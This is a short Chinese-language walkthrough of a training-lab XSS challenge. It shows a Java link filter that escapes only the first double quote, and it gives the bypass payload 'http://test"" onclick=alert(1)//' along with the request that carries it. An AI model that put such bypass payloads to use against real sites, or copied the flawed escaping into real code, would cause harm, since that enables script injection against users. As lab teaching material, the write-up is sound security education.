# Cross Site Scripting 5(跨站脚本攻击 5)

## 题介绍
在xss注入点输入javascript,执行一个alert弹框 

## 功能实现 
请求数据包  
```
POST /challenges/f37d45f597832cdc6e91358dca3f53039d4489c94df2ee280d6203b389dd5671 HTTP/1.1


searchTerm=http%3A%2F%2Ftest%22%22+onciclk%3Dalert(1)%2F%2F&csrfToken=139493510921427323986105593611916916558
```
对应功能代码   
```
String htmlOutput = new String();
String userPost = new String();
String searchTerm = request.getParameter("searchTerm");  //请求的参数  
log.debug("User Submitted - " + searchTerm);
searchTerm = XssFilter.badUrlValidate(searchTerm);   //进行过滤  
userPost = "<a href=\"" + searchTerm + "\">Your HTTP Link!</a>";  //返回到前端的 html代码 
log.debug("After WhiteListing - " + searchTerm);

boolean xssDetected = FindXSS.search(userPost);
if(xssDetected)
{
	htmlOutput = "<h2 class='title'>" + bundle.getString("result.wellDone") + "</h2>" +
			"<p>" + bundle.getString("result.youDidIt") + "<br />" +
			bundle.getString("result.resultKey") + " <a>" +
				Hash.generateUserSolution(
						Getter.getModuleResultFromHash(getServletContext().getRealPath(""), levelHash),
					(String)ses.getAttribute("userName")
				)
			+ "</a>";
}


public static String XssFilter.badUrlValidate (String input)
{
	String howToMakeAUrlUrl = new String("https://www.google.com/search?q=What+does+a+HTTP+link+look+like");
	input = input.toLowerCase();
	if (input.startsWith("http"))
	{
		try 
		{   //对双引号进行了转义 但只转义了一个双引号  
			URL theUrl = new URL(input.replaceAll("#", "&#x23;").replaceAll("<", "&#x3c;").replaceAll(">", "&#x3e;").replaceFirst("\"", "&quot;"));
			input = theUrl.toString();
		} 
		catch (MalformedURLException e) 
		{
			log.debug("Could not Cast URL from input: " + e.toString());
			input = howToMakeAUrlUrl;
		}
	}
	else
	{
		log.debug("Was not a HTTP URL");
		input = howToMakeAUrlUrl;
	}
	return input;
}
```

## 解题步骤  

从代码看，返回到前端是一个html a标签的 链接存在注入，所以必须 输入一个双引号闭合前面的双引号，才能正确执行，同时过滤时使用的 replaceFirst 函数，只会过滤第一个双引号 ，因此输入两个双引号即可   
```
http://test"" onclick=alert(1)//  
```
## 总结  

过滤要严格,否则就会导致安全问题 